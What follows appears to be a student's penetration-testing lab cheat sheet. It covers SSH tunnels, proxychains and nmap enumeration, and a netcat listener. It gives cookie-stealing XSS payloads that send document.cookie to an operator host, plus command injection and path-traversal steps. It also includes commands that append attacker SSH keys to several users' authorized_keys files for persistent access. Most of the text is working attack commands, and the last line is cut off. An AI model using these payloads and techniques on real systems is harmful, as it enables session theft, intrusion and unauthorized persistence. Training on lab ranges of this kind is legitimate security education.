# Tunnels
ssh student@10.50.39.150 -L 10300:192.168.28.120:4242
ssh student@localhost -p 10300 -D 9050
# Exploiting Vulnerabilities
```shell
#python to find ips that are online
for i in {1..254}; do (ping -c 1 192.168.150.$i | grep "bytes from" &); done | awk '{print $4}' | cut -d: -f1 > ips2.txt
#now create local file of ips(copy/paste)
proxychains nmap -iL ips.txt
#use to scan the ips you grabbed
proxychains nmap -iL ips.txt
#copy over ips file to your ops station ot proxy chains it
proxychains nmap 192.168.28.96/27 -Pn --script banner.nse
#begin your different nmap scans for further emueration
nmap -p 445 --script smb-os-discovery 192.168.28.5
nmap 10.50.42.159 -Pn -p 80 --script http-enum.nse
nmap 10.50.42.159 -Pn -p 80 --script http-robots.txt.nse
#net cat
nc -lvknp #this will allows connections to connectio
ssh student@10.50.39.150 -L 10300:192.168.28.120:4242
ssh student@localhost -p 10300 -D 9050
#location of all nmap scripts
/usr/share/namp/scripts$ : nmap 
#pull out all directories in browser 
#interact with buttons
#Javascript to steal cookie
<script>document.location="http://OP-Station-IP:OPS-PORT/?username=" + document.cookie;</script>
<script>window.location.href="http://website/?"+document.cookie;</script>
<script>write.location.href="http://10.50.20.97"</script>
#put file into server, adds it. Now that code is ran on browser
```
# Server Side injections
```shell
#enumerate the server, view directories
ls ; pwd 
whoami
#see whats in the home directory to see users
ls -shla ../../../../../../home/comrade/.ssh
#make .ssh directoires in the users folders
mkdir ../../../../../../home/comrade/.ssh/
ls the "www.html" directory
cat /etc/passwd | grep www-data
mkdir ../../../../../var/www/.ssh
ls -latr & netstat -rn
|| ifconfig
mkdir /var/www/.ssh # make ssh directory in the ww-datas user folder
ssh-keygen #this will ask o generate file. LEAVE DEFAULT
cd .ssh
cat id_rsa.pub # everything in this file is your ssh key
#use ssh keys from machine to authenticate
echo "RSA key" >> /var/www/.ssh/authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDveZOWeA/wkiIal9Itl+4CV85j8lG5afCf6mCQ1NaXknhhoWjtQD1fTC2jXhTgkl5nh+54G1OzxEpuWe8a7mijkeiUWqQgIBqOvlv0Akx8Z7LUWP5cm1qx5v6DktGn2KmDucdAA+aEZk6oF6q5btPF14C2ShLDdOJT9R2V9HUciEKb9aLyZ28niIja8YWeEPl/UQWTHRijg2usXV693WwZRfvXWRWmEGz1wusNISntG+5Pk3WFg6SIeikQuVwgppjxftil2zHxlWyyZUdPC7pN1R8leXhF7Vrpw2C5xRcRxf0AFO/1JjLu9jfVaK+1+Jm6LHkuN/K0zT0qmpuT0KBr" >> ../../../../../../var/www/.ssh/authorized_keys
ls -shla ../../../../../../home/comrade/.ssh/authorized_keys
 #now you can ssh in as www-data
 ssh www-data@<ip>
 ```

echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDveZOWeA/wkiIal9Itl+4CV85j8lG5afCf6mCQ1NaXknhhoWjtQD1fTC2jXhTgkl5nh+54G1OzxEpuWe8a7mijkeiUWqQgIBqOvlv0Akx8Z7LUWP5cm1qx5v6DktGn2KmDucdAA+aEZk6oF6q5btPF14C2ShLDdOJT9R2V9HUciEKb9aLyZ28niIja8YWeEPl/UQWTHRijg2usXV693WwZRfvXWRWmEGz1wusNISntG+5Pk3WFg6SIeikQuVwgppjxftil2zHxlWyyZUdPC7pN1R8leXhF7Vrpw2C5xRcRxf0AFO/1JjLu9jfVaK+1+Jm6LHkuN/K0zT0qmpuT0KBr" >> ../../../../../../home/billybob/.ssh/authorized_keys


echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDgP2uXYcb+W40AxfGwjsfFlA6jR1/zL711bXQAjvAuEv5L6tNVkdDyNNdD66Q8Jwsh8DzLPDqeOTmQr7FDMAO5sCD7z+R+kEpvoVzBsgKXL22l2ipxGtCxJzhI1HT16fYB1BZPqmZpJylBdym3KN0yZvgFMs7B0jb9SFkh/+Jp1OxzohX88Xc2j+Dk1URkY0xZOTvOgYafFjbFINaeuVMqb+YeEyj9jxxNFo69F4selrftFmaf5AupSiW+P8GjOReArWBxEgvcLqshl+gTuf817jxb2terzW8f/qVK09XsepMPPZ5elfUqSzK1N3a4sTu1+0EsGALGjB/iSXbeCmcD comrade@extranet.site.donovia >> ../../../../../